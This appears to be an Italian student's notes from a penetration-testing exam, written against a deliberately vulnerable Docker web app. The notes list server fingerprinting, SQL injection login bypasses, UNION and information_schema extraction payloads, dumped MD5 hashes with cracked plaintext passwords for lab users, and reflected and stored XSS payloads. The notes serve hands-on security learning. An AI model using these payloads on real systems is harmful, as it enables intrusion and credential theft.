# ProgettoPT
Progetto Penetration Testing

*docker pull gabrielec/ptexam*

*docker run gabrielec/ptexam*

[Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)

Info generiche

- Debian (url random da pagina di errore Apache)

- Apache server 2.4.38 (url random da pagina di errore Apache)

- PHP 7.2.34 (Response Header e debug.php)

- MariaDB (carattere ' in username nella pagina login)

- Tabella con gli Utenti (Case insensitive):

  - Colonna Username (Campo Username nel Login: ' OR Username #)

  - Colonna Password (Campo Username nel Login: ' OR Password #)

  - Colonna Id (Campo Username nel Login: ' OR Id #)

- Query per Login:
  
  - seleziona due parametri (' OR 1 LIKE 1 UNION SELECT 1, 1 #)

  - Carattere = non permesso

  - sostituisce gli spazi con dei +

  - hash MD5 di password (Username: frog'; password: frog)

- Pagine (non banali) presenti: (metasploit: auxiliary/scanner/http/files_dir)

  - config.php
  
    - Vuota
  
  - debug.php
  
    - Server Administrator: webmaster@localhost

    - Server Root: /etc/apache2

    - DOCUMENT_ROOT: /var/www/html

    - SMTP

  - logout.php

- Utenti: (enum_users())

  - {'sysadmin', 'utente', 'agentx', 'tizio.incognito', 'jackofspade'}

- Il message di un report non viene visualizzato nella pagina /report.php

Vulnerabilità, PoF e Exploit

- SQL Injection (/login.php)
  
  - Bypass Login:

    - ' OR Username LIKE (SELECT Username) LIMIT 1; #

    - ' OR Username LIKE 'agentX' LIMIT 1; #

  - Password (hashed MD5):  (get_password())

    - agentx: b20e0aaa66fdd9a7a5b2ebf49d32b91b 

    - sysadmin: fcea920f7412b5da7be0cf42b8c93759 (Plain: 1234567)

    - utente: bed128365216c019988915ed3add75fb (Plain: passw0rd)

    - tizio.incognito: 5ebe2294ecd0e0f08eab7690d2a6ee69 (Plain: secret)

    - jackofspade: 617882784af86bff022c4b57a62c807b

  - Id:  (get_id())

    - agentx: 10 

    - sysadmin: 1337

    - utente: 42

    - tizio.incognito: 7

    - jackofspade: 8

(Informazioni sugli utenti confermate dall'injection sui reports)

- SQL Injection (/send.php) 
  
  - Tabella con i report con 2 campi (Campo title: test2', 'abc2'); # )

  - User MySQL connesso a PHP: admin@localhost (Campo title: 123', (SELECT user())); # )

  - System User: admin@localhost

  - Nome Database: niadb

  - Versione MariaDB: 10.3.39-MariaDB-0+deb10u2 ()

  - Tabelle DB: (inject_sql('(SELECT table_name FROM information_schema.tables WHERE table_schema LIKE 'niadb' LIMIT 0, 1)))

    - reports(repid: smallint, agent: varchar, title: varchar, message: varchar) (inject_sql("(SELECT CONCAT(column_name, data_type) FROM information_schema.columns WHERE table_schema LIKE 'niadb' AND table_name LIKE 'reports' LIMIT 0, 1)"))

    - agents(id:smallint, username: varchar, password: varchar) (inject_sql("(SELECT CONCAT(column_name, data_type) FROM information_schema.columns WHERE table_schema LIKE 'niadb' AND table_name LIKE 'agents' LIMIT 0, 1)"))

- Reflected XSS (/welcome.php) (PoC non trovato perchè < e > sono nella blacklist)

- Reflected XSS (/recovery.php) ( <script>alert(1)</script> )

- Stored XSS (/report.php) ( 123', '<script>alert(1)</script>')); # )